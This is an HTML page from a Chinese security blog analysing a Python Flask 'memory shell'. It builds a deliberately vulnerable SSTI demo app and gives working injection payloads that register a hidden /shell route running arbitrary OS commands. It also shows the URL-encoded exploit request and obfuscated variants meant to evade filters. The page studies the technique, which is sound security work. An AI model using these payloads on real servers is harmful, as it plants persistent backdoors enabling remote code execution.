@@ -1,0 +1,347 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,Python,SSTI,内存马,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>浅析Python Flask内存马 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        浅析Python Flask内存马
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2021-04-07T11:32:22.000Z">
+        2021-04-07
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/">SSTI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内存马/">内存马</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近看到一个Python Flask内存马，学习一下：<a href="https://github.com/iceyhexman/flask_memory_shell" target="_blank" rel="noopener">https://github.com/iceyhexman/flask_memory_shell</a></p>
+<h2 id="0x01-Python-Flask内存马"><a href="#0x01-Python-Flask内存马" class="headerlink" title="0x01 Python Flask内存马"></a>0x01 Python Flask内存马</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>简单写个Flask SSTI漏洞环境：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    person = <span class="string">'guest'</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        person = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    template = <span class="string">'&lt;h2&gt;Hello %s!&lt;/h2&gt;'</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>原始Flask内存马payload，其中的默认命令也可以去掉：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())"</span>,&#123;<span class="string">'_request_ctx_stack'</span>:url_for.__globals__[<span class="string">'_request_ctx_stack'</span>],<span class="string">'app'</span>:url_for.__globals__[<span class="string">'current_app'</span>]&#125;)</span><br></pre></td></tr></table></figure>
+<p>访问如下URL生成Flask内存马：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?name=&#123;&#123;url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>最后访问/shell内存马接口即可执行任意命令：</p>
+<p><img src="/2021/04/07/浅析Python-Flask内存马/1.png" alt=""></p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们将payload拆开来逐层分析：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](</span><br><span class="line">	<span class="string">"app.add_url_rule(</span></span><br><span class="line"><span class="string">		'/shell', </span></span><br><span class="line"><span class="string">		'shell', </span></span><br><span class="line"><span class="string">		lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()</span></span><br><span class="line"><span class="string">		)</span></span><br><span class="line"><span class="string">	"</span>,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="string">'_request_ctx_stack'</span>:url_for.__globals__[<span class="string">'_request_ctx_stack'</span>],</span><br><span class="line">		<span class="string">'app'</span>:url_for.__globals__[<span class="string">'current_app'</span>]</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h4 id="url-for-globals-39-builtins-39-39-eval-39"><a href="#url-for-globals-39-builtins-39-39-eval-39" class="headerlink" title="url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]"></a><code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code></h4><p>这个是Flask SSTI中的payload。</p>
+<p>url_for()是Flask的一个内置函数：</p>
+<p><img src="/2021/04/07/浅析Python-Flask内存马/3.png" alt=""></p>
+<p>通过Flask内置函数可以调用其<code>__globals__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，这里看到是支持<code>__builtins__</code>的：</p>
+<p><img src="/2021/04/07/浅析Python-Flask内存马/4.png" alt=""></p>
+<p><code>__builtins__</code>即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。其中是包含eval、exec等函数的：</p>
+<p><img src="/2021/04/07/浅析Python-Flask内存马/5.png" alt=""></p>
+<p>直接调用就能执行命令了：</p>
+<p><img src="/2021/04/07/浅析Python-Flask内存马/6.png" alt=""></p>
+<h4 id="app-add-url-rule-函数"><a href="#app-add-url-rule-函数" class="headerlink" title="app.add_url_rule()函数"></a>app.add_url_rule()函数</h4><p>在Flask中注册路由的时候是添加的<a href="mailto:`@app.route" target="_blank" rel="noopener">`@app.route</a>()`装饰器来实现的。</p>
+<p>点进去看到其源码实现，其调用了add_url_rule()函数来添加路由：</p>
+<p><img src="/2021/04/07/浅析Python-Flask内存马/2.png" alt=""></p>
+<p>add_url_rule()函数定义：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint=<span class="keyword">None</span>, view_func=<span class="keyword">None</span>, provide_automatic_options=<span class="keyword">None</span>, **options)</span><br></pre></td></tr></table></figure>
+<p>参数说明：</p>
+<ul>
+<li>rule：函数对应的URL规则，满足条件和app.route()的第一个参数一样，必须以<code>/</code>开头；</li>
+<li>endpoint：端点，即在使用url_for()进行反转的时候，这里传入的第一个参数就是endpoint对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为endpoint的值；</li>
+<li>view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号）；</li>
+<li>provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options =添加规则前为False；</li>
+<li>options：要转发到基础规则对象的选项。Werkzeug的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听GET（并隐式地侦听HEAD）。从Flask0.6开始，通过标准请求处理隐式添加和处理选项；</li>
+</ul>
+<p>由此可见，payload这部分是动态添加了一条路由，而处理该路由的函数是个由lambda关键字定义的匿名函数。</p>
+<h4 id="lambda与-request-ctx-stack"><a href="#lambda与-request-ctx-stack" class="headerlink" title="lambda与_request_ctx_stack"></a>lambda与_request_ctx_stack</h4><p>lambda即匿名函数，payload中add_url_rule()函数的第三个参数定义了一个lambda匿名函数，其中通过os库的popen()函数执行从Web请求中获取的cmd参数值并返回结果，其中该参数值默认为whoami。</p>
+<p><code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例。</p>
+<p>Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p>
+<h3 id="绕过变形"><a href="#绕过变形" class="headerlink" title="绕过变形"></a>绕过变形</h3><p>以Python沙箱逃逸的技巧为例：</p>
+<ul>
+<li><code>url_for</code>可用<code>get_flashed_messages</code>或<code>request.application.__self__._get_data_for_json</code>等替换；</li>
+<li>代码执行函数替换，如exec等替换eval；</li>
+<li>字符串可采用拼接方式，如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>；</li>
+<li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换；</li>
+<li><code>[]</code>中括号可用<code>.__getitem__()</code>或<code>.pop()</code>替换；</li>
+<li>…</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.application.__self__._get_data_for_json.__getattribute__(<span class="string">'__globa'</span>+<span class="string">'ls__'</span>).__getitem__(<span class="string">'__bui'</span>+<span class="string">'ltins__'</span>).__getitem__(<span class="string">'ex'</span>+<span class="string">'ec'</span>)(<span class="string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'calc')).read())"</span>,&#123;<span class="string">'_request_ct'</span>+<span class="string">'x_stack'</span>:get_flashed_messages.__getattribute__(<span class="string">'__globa'</span>+<span class="string">'ls__'</span>).pop(<span class="string">'_request_'</span>+<span class="string">'ctx_stack'</span>),<span class="string">'app'</span>:get_flashed_messages.__getattribute__(<span class="string">'__globa'</span>+<span class="string">'ls__'</span>).pop(<span class="string">'curre'</span>+<span class="string">'nt_app'</span>)&#125;)</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Python-Flask内存马"><span class="toc-text">0x01 Python Flask内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#复现"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#url-for-globals-39-builtins-39-39-eval-39"><span class="toc-text">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#app-add-url-rule-函数"><span class="toc-text">app.add_url_rule()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lambda与-request-ctx-stack"><span class="toc-text">lambda与_request_ctx_stack</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过变形"><span class="toc-text">绕过变形</span></a></li></ol></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/" rel="next" title="浅析WebLogic JNDI注入RCE（CVE-2021-2109）">
+          浅析WebLogic JNDI注入RCE（CVE-2021-2109）
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2021/04/20/通过WebRTC获取代理池中攻击者真实IP/" rel="prev" title="通过WebRTC获取代理池中攻击者真实IP">
+            通过WebRTC获取代理池中攻击者真实IP
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
